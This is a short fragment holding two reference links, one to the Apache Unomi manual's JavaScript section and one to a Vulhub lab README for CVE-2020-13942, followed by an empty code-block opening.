http://unomi.apache.org/manual/latest/index.html#_javascript
https://github.com/vulhub/vulhub/blob/master/unomi/CVE-2020-13942/README.zh-cn.md

```